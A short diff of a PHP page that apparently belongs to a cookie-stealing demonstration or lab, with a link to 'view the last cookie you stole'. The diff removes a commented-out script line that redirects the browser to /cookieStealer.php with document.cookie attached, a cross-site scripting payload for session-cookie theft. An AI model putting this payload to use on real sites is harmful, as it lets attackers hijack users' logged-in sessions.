@@ -28,7 +28,6 @@
 <?php
 	echo "View the last cookie you stole <a href='/viewCookies.php'>here</a><br><br>";
 	echo $html;
-//	echo "<script>location.href='/cookieStealer.php?cookie='+document.cookie;</script>";
 ?>
 </div>
 </body>
